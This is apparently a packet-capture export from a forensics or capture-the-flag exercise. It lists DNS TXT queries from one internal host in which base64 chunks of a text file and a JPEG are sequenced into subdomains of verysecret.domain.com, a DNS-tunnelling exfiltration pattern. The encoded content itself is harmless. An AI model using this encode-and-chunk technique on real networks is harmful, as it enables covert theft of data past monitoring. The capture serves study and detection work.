"No.","Time","Source","Destination","Protocol","Length","Info"
"67","1.278636","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x5783 TXT 1.67.cmFzdGljIGFj.verysecret.domain.com"
"68","1.312706","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x83db TXT 1.68.dGlvbi4KClRI.verysecret.domain.com"
"69","1.329825","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xf3f6 TXT 1.69.RSBESVNIV0FT.verysecret.domain.com"
"70","1.348227","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x682d TXT 1.70.SEVSIEFXQUlU.verysecret.domain.com"
"71","1.374358","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x236f TXT 1.71.Uy4g8J+rpwoK.verysecret.domain.com"
"72","1.391551","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xee0b TXT 1.72.WWVzLCB5b3Ug.verysecret.domain.com"
"73","1.409525","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xb124 TXT 1.73.aGVhcmQgdXMu.verysecret.domain.com"
"74","1.435993","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x4595 TXT 1.74.IFRoYXQgdGVy.verysecret.domain.com"
"75","1.454460","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x55ab TXT 1.75.cmlmeWluZyBt.verysecret.domain.com"
"76","1.472636","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x789e TXT 1.76.YWNoaW5lIG9m.verysecret.domain.com"
"77","1.489601","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x311d TXT 1.77.IHN3aXJsaW5n.verysecret.domain.com"
"78","1.506575","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xb48e TXT 1.78.IHdhdGVyIGFu.verysecret.domain.com"
"79","1.524136","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x373a TXT 1.79.ZCBkZWFmZW5p.verysecret.domain.com"
"80","1.550869","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x3a5a TXT 1.80.bmcgbm9pc2Vz.verysecret.domain.com"
"81","1.568778","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x7237 TXT 1.81.LiBUaGUgb25l.verysecret.domain.com"
"82","1.590157","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xb3d9 TXT 1.82.IE1pdHRlbnMg.verysecret.domain.com"
"83","1.606802","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xdad5 TXT 1.83.aGFzIGFsd2F5.verysecret.domain.com"
"84","1.623730","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x8bd8 TXT 1.84.cyBleWVkIHdp.verysecret.domain.com"
"85","1.650676","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xb287 TXT 1.85.dGggCnN1c3Bp.verysecret.domain.com"
"86","1.669715","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x7acd TXT 1.86.Y2lvbi4gT25l.verysecret.domain.com"
"87","1.687671","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xab89 TXT 1.87.IHdyb25nIG1v.verysecret.domain.com"
"88","1.706978","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x6078 TXT 1.88.dmUgZnJvbSB5.verysecret.domain.com"
"89","1.724548","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xd6e6 TXT 1.89.b3UsIGFuZCBz.verysecret.domain.com"
"90","1.743939","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x0ea8 TXT 1.90.aGUgZ29lcyBp.verysecret.domain.com"
"91","1.762412","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xf17c TXT 1.91.buKAlGRlbGlj.verysecret.domain.com"
"92","1.794177","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xbe2a TXT 1.92.YXRlIGN5Y2xl.verysecret.domain.com"
"93","1.814042","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x7efe TXT 1.93.LCBvZiBjb3Vy.verysecret.domain.com"
"94","1.831934","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xc1f6 TXT 1.94.c2UsIHdl4oCZ.verysecret.domain.com"
"95","1.849937","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x3eb5 TXT 1.95.cmUgbm90IG1v.verysecret.domain.com"
"96","1.869235","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x4348 TXT 1.96.bnN0ZXJzLiBC.verysecret.domain.com"
"97","1.885063","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xc949 TXT 1.97.dXQgbWFrZSBu.verysecret.domain.com"
"98","1.901998","10.0.0.1","8.8.8.8","DNS","99","Standard query 0xce4e TXT 1.98.byBtaXN0YWtl.verysecret.domain.com"
"99","1.919879","10.0.0.1","8.8.8.8","DNS","99","Standard query 0x3e6c TXT 1.99.LCBzaGUgCndv.verysecret.domain.com"
"100","1.938752","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xe0e7 TXT 1.100.buKAmXQgbGlr.verysecret.domain.com"
"101","1.956084","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x0ab9 TXT 1.101.ZSBpdC4gQW5k.verysecret.domain.com"
"102","1.974839","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xb5db TXT 1.102.IG5laXRoZXIg.verysecret.domain.com"
"103","2.000760","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xf62d TXT 1.103.d2lsbCB5b3Uu.verysecret.domain.com"
"104","2.018247","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x427a TXT 1.104.CgpPVVIgREVN.verysecret.domain.com"
"105","2.050181","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xcf52 TXT 1.105.QU5EUzoKT25l.verysecret.domain.com"
"106","2.069624","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xcd89 TXT 1.106.ICgxKSBjYW4g.verysecret.domain.com"
"107","2.088407","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x766e TXT 1.107.b2YgcHJlbWl1.verysecret.domain.com"
"108","2.106258","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x01ee TXT 1.108.bSB0dW5hIGlu.verysecret.domain.com"
"109","2.223975","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xf5f0 TXT 1.109.IG9pbC4gTm9u.verysecret.domain.com"
"110","2.244536","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x681d TXT 1.110.ZSBvZiB0aGF0.verysecret.domain.com"
"111","2.265684","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x98eb TXT 1.111.IGNoZWFwIHdh.verysecret.domain.com"
"112","2.282635","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x7d87 TXT 1.112.dGVyLWJhc2Vk.verysecret.domain.com"
"113","2.310803","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xce72 TXT 1.113.IG5vbnNlbnNl.verysecret.domain.com"
"114","2.330184","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x156b TXT 1.114.LiBXZSBjaGVj.verysecret.domain.com"
"115","2.349663","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x0226 TXT 1.115.ayBsYWJlbHMu.verysecret.domain.com"
"116","2.368792","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x611f TXT 1.116.CkEgZnJlc2gs.verysecret.domain.com"
"117","2.387004","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x00db TXT 1.117.IHVudG91Y2hl.verysecret.domain.com"
"118","2.405539","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x8f07 TXT 1.118.ZCBjYXRuaXAg.verysecret.domain.com"
"119","2.424294","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x04dc TXT 1.119.dG95LiBOb3Qg.verysecret.domain.com"
"120","2.445007","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xe893 TXT 1.120.b25lIG9mIHRo.verysecret.domain.com"
"121","2.462880","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x6538 TXT 1.121.b3NlIGhhbGYt.verysecret.domain.com"
"122","2.481050","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x48b0 TXT 1.122.Y2hld2VkIHRo.verysecret.domain.com"
"123","2.499114","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xe351 TXT 1.123.aW5ncyBmcm9t.verysecret.domain.com"
"124","2.518624","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x7aa4 TXT 1.124.IHVuZGVyIHRo.verysecret.domain.com"
"125","2.537199","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x2542 TXT 1.125.ZSBjb3VjaC4K.verysecret.domain.com"
"126","2.556961","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xeccc TXT 1.126.TGFwIHRpbWUg.verysecret.domain.com"
"127","2.575987","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xf82b TXT 1.127.b24gZGVtYW5k.verysecret.domain.com"
"128","2.596546","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x885d TXT 1.128.LiBObyBzdWRk.verysecret.domain.com"
"129","2.615125","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x0327 TXT 1.129.ZW4gbW92ZW1l.verysecret.domain.com"
"130","2.638192","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xbb10 TXT 1.130.bnRzLiBObyDi.verysecret.domain.com"
"131","2.655128","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x8836 TXT 1.131.gJxJIGhhdmUg.verysecret.domain.com"
"132","2.675404","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x4741 TXT 1.132.d29yayB0byBk.verysecret.domain.com"
"133","2.694222","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xd2e8 TXT 1.133.by7igJ0gTWl0.verysecret.domain.com"
"134","2.711167","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x116e TXT 1.134.dGVucyBjYWxs.verysecret.domain.com"
"135","2.729551","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xe7f2 TXT 1.135.cyB0aGUgc2hv.verysecret.domain.com"
"136","2.748743","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x1ba1 TXT 1.136.dHMuCkRlbGl2.verysecret.domain.com"
"137","2.766900","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xf8d0 TXT 1.137.ZXIgdGhlc2Ug.verysecret.domain.com"
"138","2.796284","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xa134 TXT 1.138.aXRlbXMgdG8g.verysecret.domain.com"
"139","2.824404","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x6d0f TXT 1.139.dGhlIHVzdWFs.verysecret.domain.com"
"140","2.843032","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x0642 TXT 1.140.IHNwb3QgKHlv.verysecret.domain.com"
"141","2.858500","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xa6a8 TXT 1.141.dSBrbm93IHdo.verysecret.domain.com"
"142","2.876629","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xc8b8 TXT 1.142.ZXJlKSBieSBt.verysecret.domain.com"
"143","2.897242","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x4279 TXT 1.143.aWRuaWdodC4g.verysecret.domain.com"
"144","2.917773","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x3ad9 TXT 1.144.Tm8gdHJpY2tz.verysecret.domain.com"
"145","2.936283","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x7415 TXT 1.145.LiBObyBkZWxh.verysecret.domain.com"
"146","2.963189","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xcb59 TXT 1.146.eXMuIE5vICJP.verysecret.domain.com"
"147","2.979239","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x215e TXT 1.147.b3BzLCBJIGZv.verysecret.domain.com"
"148","2.996726","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x1ce7 TXT 1.148.cmdvdC4iIE9y.verysecret.domain.com"
"149","3.015060","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x6b6f TXT 1.149.IGVsc2XigKYK.verysecret.domain.com"
"150","3.034245","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x0253 TXT 1.150.Ck1JVFRFTlMg.verysecret.domain.com"
"151","3.051891","10.0.0.1","8.8.8.8","DNS","100","Standard query 0xdb4d TXT 1.151.VEFLRVMgQSBT.verysecret.domain.com"
"152","3.068690","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x758c TXT 1.152.UElOLgoKVGlj.verysecret.domain.com"
"153","3.096672","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x8641 TXT 1.153.ay4gVG9jay4g.verysecret.domain.com"
"154","3.115612","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x6f6a TXT 1.154.4o+zCgrigJQg.verysecret.domain.com"
"155","3.137377","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x808e TXT 1.155.VGhlIFB1cnJw.verysecret.domain.com"
"156","3.157402","10.0.0.1","8.8.8.8","DNS","100","Standard query 0x48fa TXT 1.156.ZXRyYXRvcnMg.verysecret.domain.com"
"157","3.176755","10.0.0.1","8.8.8.8","DNS","96","Standard query 0x1852 TXT 1.157.8J+YvAo=.verysecret.domain.com"
"158","12.295257","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x3dc8 TXT 2.1./9j/4AAQSkZJRgABAQAASABIAAD/4QCARXhpZgAATU0AKgAAAAgABQESAAMAAAA.verysecret.domain.com"
"159","12.314309","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x7f22 TXT 2.2.BAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAA.verysecret.domain.com"
"160","12.334514","10.0.0.1","8.8.8.8","DNS","149","Standard query 0xc6a1 TXT 2.3.ABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAKgAgAEAAAAAQAAA+igAwAEAAAAA.verysecret.domain.com"
"161","12.351442","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x8903 TXT 2.4.QAABTUAAAAA/+0AOFBob3Rvc2hvcCAzLjAAOEJJTQQEAAAAAAAAOEJJTQQlAAAA.verysecret.domain.com"
"162","12.373506","10.0.0.1","8.8.8.8","DNS","149","Standard query 0xbc96 TXT 2.5.AAAQ1B2M2Y8AsgTpgAmY7PhCfv/iAihJQ0NfUFJPRklMRQABAQAAAhhhcHBsBAA.verysecret.domain.com"
"163","12.391235","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x3d7d TXT 2.6.AAG1udHJSR0IgWFlaIAfmAAEAAQAAAAAAAGFjc3BBUFBMAAAAAEFQUEwAAAAAAA.verysecret.domain.com"
"164","12.408680","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x18ee TXT 2.7.AAAAAAAAAAAAAAAAD21gABAAAAANMtYXBwbOz9o444hUfDbbS9T3raGC8AAAAAA.verysecret.domain.com"
"165","12.428188","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x2ec9 TXT 2.8.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACmRlc2MAAAD8AAAAMGNwcnQAAAEs.verysecret.domain.com"
"166","12.446522","10.0.0.1","8.8.8.8","DNS","149","Standard query 0x1f24 TXT 2.9.AAAAUHd0cHQAAAF8AAAAFHJYWVoAAAGQAAAAFGdYWVoAAAGkAAAAFGJYWVoAAAG.verysecret.domain.com"
"167","12.471032","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x57f1 TXT 2.10.4AAAAFHJUUkMAAAHMAAAAIGNoYWQAAAHsAAAALGJUUkMAAAHMAAAAIGdUUkMAAA.verysecret.domain.com"
"168","12.487155","10.0.0.1","8.8.8.8","DNS","150","Standard query 0xda40 TXT 2.11.HMAAAAIG1sdWMAAAAAAAAAAQAAAAxlblVTAAAAFAAAABwARABpAHMAcABsAGEAe.verysecret.domain.com"
"169","12.507123","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x6738 TXT 2.12.QAgAFAAM21sdWMAAAAAAAAAAQAAAAxlblVTAAAANAAAABwAQwBvAHAAeQByAGkA.verysecret.domain.com"
"170","12.525775","10.0.0.1","8.8.8.8","DNS","150","Standard query 0xffee TXT 2.13.ZwBoAHQAIABBAHAAcABsAGUAIABJAG4AYwAuACwAIAAyADAAMgAyWFlaIAAAAAA.verysecret.domain.com"
"171","12.543387","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x19f0 TXT 2.14.AAPbVAAEAAAAA0yxYWVogAAAAAAAAg98AAD2/////u1hZWiAAAAAAAABKvwAAsT.verysecret.domain.com"
"172","12.561809","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x2564 TXT 2.15.cAAAq5WFlaIAAAAAAAACg4AAARCwAAyLlwYXJhAAAAAAADAAAAAmZmAADypwAAD.verysecret.domain.com"
"173","12.588994","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x197c TXT 2.16.VkAABPQAAAKW3NmMzIAAAAAAAEMQgAABd7///MmAAAHkwAA/ZD///ui///9owAA.verysecret.domain.com"
"174","12.607772","10.0.0.1","8.8.8.8","DNS","150","Standard query 0xbfd6 TXT 2.17.A9wAAMBu/8AAEQgFNQPoAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAA.verysecret.domain.com"
"175","12.636006","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x04b1 TXT 2.18.BAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQ.verysecret.domain.com"
"176","12.654901","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x5ea1 TXT 2.19.cicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHS.verysecret.domain.com"
"177","12.673088","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x136b TXT 2.20.ElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Sl.verysecret.domain.com"
"178","12.692656","10.0.0.1","8.8.8.8","DNS","150","Standard query 0x4655 TXT 2.21.pqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX.verysecret.domain.com"
